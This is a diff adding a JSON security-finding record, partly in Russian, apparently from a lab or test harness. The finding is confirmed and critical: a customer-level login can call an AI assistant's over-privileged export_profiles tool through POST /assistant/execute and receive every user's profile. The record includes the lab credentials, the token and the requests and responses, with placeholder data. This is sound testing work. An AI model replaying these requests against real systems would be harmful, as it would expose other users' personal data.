@@ -1,0 +1,76 @@
+{
+  "id": "L03",
+  "route": "POST /assistant/execute",
+  "category": "E",
+  "severity": "Критическая",
+  "verdict": "подтверждена",
+  "why": "помощник клиента alice выполнил export_profiles и вернул все профили — инструмент с чрезмерными полномочиями доступен customer",
+  "records": [
+    {
+      "request": {
+        "method": "POST",
+        "path": "/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "alice",
+          "password": "learn-alice"
+        }
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.14.4",
+          "Date": "Fri, 30 Oct 2026 21:37:43 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "45"
+        },
+        "body": "{\"token\": \"cc8adf6888f54269bdf3209e44e4e3d4\"}",
+        "json": {
+          "token": "cc8adf6888f54269bdf3209e44e4e3d4"
+        }
+      }
+    },
+    {
+      "request": {
+        "method": "POST",
+        "path": "/assistant/execute",
+        "headers": {
+          "X-Token": "cc8adf6888f54269bdf3209e44e4e3d4",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "decision": {
+            "tool": "export_profiles",
+            "arguments": {}
+          }
+        }
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.14.4",
+          "Date": "Fri, 30 Oct 2026 21:37:43 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "188"
+        },
+        "body": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]",
+        "json": [
+          {
+            "id": 1,
+            "name": "TEST_ALICE",
+            "email": "alice@example.invalid",
+            "address": "TEST_ADDRESS_A"
+          },
+          {
+            "id": 2,
+            "name": "TEST_BOB",
+            "email": "bob@example.invalid",
+            "address": "TEST_ADDRESS_B"
+          }
+        ]
+      }
+    }
+  ]
+}
